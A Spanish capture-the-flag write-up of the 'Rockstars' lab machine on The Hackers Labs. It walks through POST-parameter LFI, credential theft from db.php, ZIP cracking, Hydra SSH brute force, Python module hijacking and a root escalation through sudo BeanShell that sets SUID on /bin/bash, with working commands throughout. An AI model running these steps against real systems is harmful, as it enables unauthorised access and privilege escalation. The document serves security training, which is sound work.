# Write-Up: Rockstars - The Hackers Labs

## Información General

- **Nombre de la máquina**: Rockstars
- **Plataforma**: The Hackers Labs
- **Dificultad**: Intermedio/Avanzado
- **Sistema Operativo**: Linux (Debian 12)
- **IP objetivo**: 192.168.231.162
- **Cadena de usuarios**: shark → wvverez → loseey → username3 → root
- **Objetivos**: Obtención de la Flag de usuario y de root
- **Fecha de resolución**: Julio de 2026

---

## FASE 1: ENUMERACIÓN

### Descubrimiento de Hosts

```bash
sudo netdiscover -r 192.168.231.0/24
```

**Resultado:**
Se localizó la máquina objetivo en 192.168.231.162.

---

### Descubrimiento de Puertos

```bash
nmap -sCV -p- 192.168.231.162 -Pn -vvv -oA rockstars
```

**Resultado:**

| Puerto | Estado | Servicio | Versión |
|--------|--------|----------|---------|
| 22/tcp | Open | SSH | OpenSSH 9.2p1 Debian 2+deb12u3 |
| 80/tcp | Open | HTTP | Apache httpd 2.4.62 (Debian) |

**Análisis:**
- Puerto 22: SSH — acceso remoto
- Puerto 80: Servidor web — punto de entrada principal

---

## FASE 2: ENUMERACIÓN WEB

### Fuzzing de Directorios

```bash
gobuster dir -u http://192.168.231.162/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 40
```

**Resultado:**

| Archivo | Status | Tamaño |
|---------|--------|--------|
| **db.php** | 200 | 0 |
| index.php | 500 | 19 |
| index.html | 200 | 0 |
| javascript/ | 301 | 323 |

**Análisis:**
- `db.php` devuelve 200 OK con tamaño 0 — archivo de configuración que no imprime salida
- `index.php` devuelve 500 Internal Server Error con 19 bytes ("Yo no soy tu marido")
- `/javascript/` es un directorio con jQuery (no útil)

---

### Descubrimiento del parámetro vulnerable (LFI)

El parámetro **no está en GET** sino en **POST**. Se descubrió usando ffuf con filtro de tamaño 19 bytes:

```bash
ffuf -w /usr/share/wordlists/dirb/common.txt -u "http://192.168.231.162/index.php" -d "FUZZ=/etc/passwd" -H "Content-Type: application/x-www-form-urlencoded" -fs 19
```

**Resultado:**
```
backdoor [Status: 200, Size: 1575, Words: 12, Lines: 31, Duration: 219ms]
```

**Parámetro vulnerable:** `backdoor` (vía POST)

---

### Lectura de db.php vía LFI (POST)

```bash
curl -XPOST http://192.168.231.162/index.php -d "backdoor=/var/www/html/db.php"
```

**Resultado:**
```
Yo no soy tu marido<?php
$usuario = "shark";
$contrasena = "djbasdnbasdas&$AAAALLthl"; 
?>
```

**Credenciales obtenidas:**
- **Usuario:** shark
- **Contraseña:** `djbasdnbasdas&$AAAALLthl`

---

### Lectura de /etc/passwd vía LFI

```bash
curl -XPOST http://192.168.231.162/index.php -d "backdoor=/etc/passwd"
```

**Usuarios con shell bash:**
```
root:x:0:0:root:/root:/bin/bash
shark:x:1001:1001:shark,,,:/home/shark:/bin/bash
wvverez:x:1002:1002:wvverez,,,:/home/wvverez:/bin/bash
loseey:x:1000:1000:loseey,,,:/home/loseey:/bin/bash
username3:x:1003:1003:usernam3,,,:/home/username3:/bin/bash
```

---

## FASE 3: ACCESO INICIAL

### SSH como shark

```bash
ssh shark@192.168.231.162
# Contraseña: djbasdnbasdas&$AAAALLthl
```

**Resultado:**
```
shark@TheHackersLabs-RockstarS:~$ whoami
shark
```

---

### User Flag

```bash
cat /home/shark/user.txt
# [FLAG_USER]
```

---

### Persistencia con clave RSA

```bash
# En Kali
ssh-keygen
ssh-copy-id shark@192.168.231.162
ssh -i id_rsa shark@192.168.231.162
```

---

## FASE 4: MOVIMIENTO LATERAL Y ESCALADA

### Los 5 comandos iniciales

```bash
whoami # shark
pwd # /home/shark
uname -a # Linux 6.1.0-26-amd64
sudo -l # Listar permisos sudo
```

---

### Técnica 1: shark → wvverez (Binario escribible `bof`)

**sudo -l mostró:**
```
User shark may run the following commands on TheHackersLabs-RockstarS:
 (wvverez) NOPASSWD: /home/shark/bof
```

**Análisis del binario:**
```bash
file bof
# bof: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, not stripped

ls -la bof
# -rwxr-xr-x 1 shark shark 7348 mar 8 10:47 bof
```
- `bof` es un ELF de 32 bits
- shark tiene **escritura** sobre él (owner)

**Explotación:**
```bash
echo "bash" > bof
sudo -u wvverez /home/shark/bof
```

**Resultado:**
```
wvverez@TheHackersLabs-RockstarS:/home/shark$ whoami
wvverez
```

**Análisis:**
- En vez de un buffer overflow, se sobrescribe el binario por `bash`
- Al ejecutarse como `wvverez`, la shell es de `wvverez`

---

### Técnica 2: wvverez → loseey (Cracking ZIP + Hydra)

**Enumeración en /home/wvverez:**
```bash
ls -la
# -rw-r--r-- 1 root root 366 mar 12 17:45 rubiales.zip
```

**Proceso de cracking (en Kali):**
```bash
# Transferir ZIP
python3 -m http.server 8000
wget http://192.168.231.162:8000/rubiales.zip

# Extraer hash
zip2john rubiales.zip > hash.txt

# Crackear con John
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
# Contraseña: princess
```

**Contenido del ZIP:**
```bash
unzip rubiales.zip
cat passwords.txt
```
13 contraseñas obtenidas.

**Fuerza bruta SSH con Hydra:**
```bash
echo -e "shark\nwvverez\nloseey\nusername3" > users.txt
hydra -L users.txt -P passwords.txt ssh://192.168.231.162 -u -f -t 4
```

**Resultado:**
```
[22][ssh] host: 192.168.231.162 login: loseey password: kmdalskdmasdnmaskj126
```

---

### SSH como loseey

```bash
ssh loseey@192.168.231.162
# Contraseña: kmdalskdmasdnmaskj126
```

---

### Técnica 3: loseey → username3 (PATH Hijacking en Python)

**sudo -l mostró:**
```
User loseey may run the following commands on TheHackersLabs-RockstarS:
 (username3) NOPASSWD: /usr/bin/python3 /home/loseey/rubiales.py
```

**Análisis del script:**
```bash
cat rubiales.py
```
```python
import psutil

def print_virtual_memory():
 vm = psutil.virtual_memory()
 print(f"Total: {vm.total} Available: {vm.available}")

if __name__ == "__main__":
 print_virtual_memory()
```

- Importa `psutil` y llama a `virtual_memory()`
- loseey puede escribir en su directorio actual

**Explotación (PATH hijacking):**
```bash
cat > psutil.py << 'EOF'
import os
os.system("bash")
EOF

sudo -u username3 /usr/bin/python3 /home/loseey/rubiales.py
```

**Resultado:**
```
username3@TheHackersLabs-RockstarS:/home/loseey$ whoami
username3
```

**Análisis:**
- Python busca imports en el directorio actual primero (PATH)
- Al colocar `psutil.py` malicioso, se ejecuta nuestro código
- La shell se ejecuta como `username3`

---

### Técnica 4: username3 → root (BeanShell / bsh)

**sudo -l mostró:**
```
User username3 may run the following commands on TheHackersLabs-RockstarS:
 (root) NOPASSWD: /usr/bin/bsh
```

**Explotación:**
```bash
sudo /usr/bin/bsh
# BeanShell 2.0b4 - by Pat Niemeyer
bsh % exec("chmod +s /bin/bash");
bsh % <Ctrl+D para salir>
bash -p
```

**Resultado:**
```
bash-5.2# whoami
root
bash-5.2# cat /root/root.txt
[FLAG_ROOT]
```

**Análisis:**
- `bsh` (BeanShell) es un intérprete Java, no bash
- Sintaxis: `exec("comando");`
- `chmod +s /bin/bash` pone SUID en bash
- `bash -p` ejecuta bash con privilegios efectivos de root

---

## FASE 5: FLAGS

### User Flag
```bash
cat /home/shark/user.txt
# [FLAG_USER]
```

### Root Flag
```bash
bash -p
cat /root/root.txt
# [FLAG_ROOT]
```

---

## CADENA DE EXPLOTACIÓN COMPLETA

```
┌─────────────────────────────────────────────────────────────────┐
│ 1. netdiscover + nmap → puertos 22 y 80 │
│ 2. gobuster → db.php (200, 0B) + index.php (500, 19B) │
│ 3. ffuf POST -fs 19 → parámetro "backdoor" │
│ 4. LFI POST backdoor=/var/www/html/db.php → credenciales shark │
│ 5. SSH shark:djbasdnbasdas&$AAAALLthl │
│ 6. shark → wvverez: binario bof escribible + sudo -l │
│ 7. wvverez → loseey: rubiales.zip → zip2john + John (princess) │
│ 8. Hydra con passwords.txt → loseey:kmdalskdmasdnmaskj126 │
│ 9. loseey → username3: PATH hijacking psutil.py + sudo python │
│ 10. username3 → root: sudo bsh → exec("chmod +s /bin/bash") │
└─────────────────────────────────────────────────────────────────┘
```

| Fase | Técnica | Herramientas |
|------|---------|--------------|
| Reconocimiento | ARP scan, port scan | netdiscover, nmap |
| Enumeración web | Fuzzing directorios, POST fuzzing | gobuster, ffuf |
| Explotación web | LFI POST parameter | curl, ffuf |
| Acceso | Credenciales de DB | SSH |
| Lateral 1 | Binario escribible (bof) | sudo -l, echo, file |
| Lateral 2 | Cracking ZIP + Hydra | zip2john, John, Hydra |
| Lateral 3 | PATH hijacking Python | psutil.py, sudo -u |
| Escalada | BeanShell (bsh) | exec(), chmod +s, bash -p |

---

## HERRAMIENTAS UTILIZADAS

| Herramienta | Propósito |
|-------------|-----------|
| netdiscover | Localizar hosts en la red (ARP) |
| nmap | Escaneo de puertos y servicios |
| gobuster | Fuzzing de directorios |
| ffuf | Fuzzing de parámetros POST con filtro de tamaño |
| curl | Peticiones HTTP, explotación LFI |
| SSH / ssh-keygen | Acceso y persistencia |
| zip2john | ZIP → hash para cracking |
| John the Ripper | Romper hashes ZIP |
| Hydra | Fuerza bruta SSH con credenciales |
| bsh (BeanShell) | Shell Java para escalada a root |

---

## ERRORES Y PROBLEMAS ENCONTRADOS

### Error 1: Fuzzing GET en lugar de POST
- **Problema:** El parámetro vulnerable (`backdoor`) solo funciona vía POST, no GET
- **Causa:** El PHP espera datos en el body, no en query string
- **Solución:** Usar ffuf con `-d "FUZZ=..."` y `-H "Content-Type: application/x-www-form-urlencoded"`

### Error 2: Filtrado incorrecto en ffuf
- **Problema:** Usar `-fs 19` filtra TODAS las respuestas porque el servidor siempre devuelve 19 bytes ("Yo no soy tu marido")
- **Causa:** El mensaje de error tiene 19 bytes, igual que las respuestas "falsas"
- **Solución:** El filtro `-fs 19` SÍ funciona porque el parámetro correcto devuelve 1575 bytes (Status 200)

### Error 3: Buscar parámetro en GET cuando es POST
- **Problema:** Todas las pruebas GET devolvían "Yo no soy tu marido"
- **Causa:** El endpoint solo procesa POST data
- **Solución:** Probar POST después de agotar GET

### Error 4: Confusión con nombres de usuarios
- **Problema:** Las notas previas mencionaban `wwwveret`, `lusail` pero los reales son `wvverez`, `loseey`
- **Causa:** Notas de otra versión o máquina similar
- **Solución:** Verificar `/etc/passwd` real en cada máquina

### Error 5: BeanShell no es bash
- **Problema:** Comandos `bash -p` y `cat` fallan dentro de bsh
- **Causa:** BeanShell usa sintaxis Java: `exec("comando");`
- **Solución:** Salir de bsh (Ctrl+D) y luego ejecutar `bash -p`

---

## LECCIONES APRENDIDAS

1. **LFI puede ser POST, no solo GET** — Probar ambos métodos
2. **Filtro de tamaño en ffuf es clave** — `-fs 19` descartó el ruido y reveló `backdoor`
3. **db.php con 0 bytes es sospechoso** — Archivos de config que no imprimen salida
4. **Binario escribible + sudo = escalada trivial** — `echo "bash" > binario`
5. **ZIP protegido → zip2john + John** — Rápido y efectivo (princess)
6. **Hydra con lista acotada** — 4 usuarios × 13 pass = 52 intentos, instantáneo
7. **PATH hijacking en Python** — Escribir módulo malicioso en directorio actual
8. **BeanShell (bsh) ≠ bash** — Sintaxis `exec("cmd");`, salir con Ctrl+D
9. **SUID en /bin/bash → bash -p** — Persistencia root limpia
10. **Verificar /etc/passwd real** — No confiar en notas antiguas

---

## REFERENCIAS

- [GTFOBins - bsh](https://gtfobins.github.io/gtfobins/bsh/)
- [GTFOBins - python](https://gtfobins.github.io/gtfobins/python/)
- [HackTricks - LFI](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
- [HackTricks - Linux Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
- [BeanShell Documentation](https://beanshell.github.io/)

---

*Write-up creado el 13 de Julio de 2026 — Explotación real verificada*


---

## 🔗 Red de Conocimiento

### Documentos Relacionados

- [[../informes/Informe_Rockstars.md|Informe_Rockstars]] — GoBuster, Hydra, Post-Explotación
- [[../apuntes Chema/Maquinas/Explotación avanzada de servicios vulnerables II.md|Explotación avanzada de servicios vulnerables II]] — Hydra, John / Hashcat, Metasploitable / DVWA
- [[../informes/Informe_Castor.md|Informe_Castor]] — Hydra, John / Hashcat, Post-Explotación
- [[Castor-THL.md|Castor-THL]] — Hydra, John / Hashcat, Path Traversal / LFI
- [[../informes/Informe_Inj3ctCrew.md|Informe_Inj3ctCrew]] — GoBuster, John / Hashcat, Post-Explotación
- [[../Apuntes/06 - Explotacion y Post-Explotacion/Explotación Avanzada de Servicios Vulnerables II — Metasploitable.md|Explotación Avanzada de Servicios Vulnerables II — Metasploitable]] — Hydra, John / Hashcat, Metasploitable / DVWA

### 🛠️ Herramientas

- [[comandos/FFUF|FFUF]]
- [[comandos/GoBuster|GoBuster]]
- [[comandos/Hydra|Hydra]]
- [[comandos/John_Hashcat|John / Hashcat]]
- [[comandos/Nmap|Nmap]]
- [[comandos/SSH|SSH]]

### 🎯 Vulnerabilidades Relacionadas

- [[Apuntes/05 - Auditoria Web/Path Traversal — 6 Casos y Bypasses.md|Path Traversal / LFI]]

> #escalada-privilegios #ffuf #gobuster #hydra #john #kali #lfi #linux #metasploitable #nmap #post-explotacion #redes #ssh
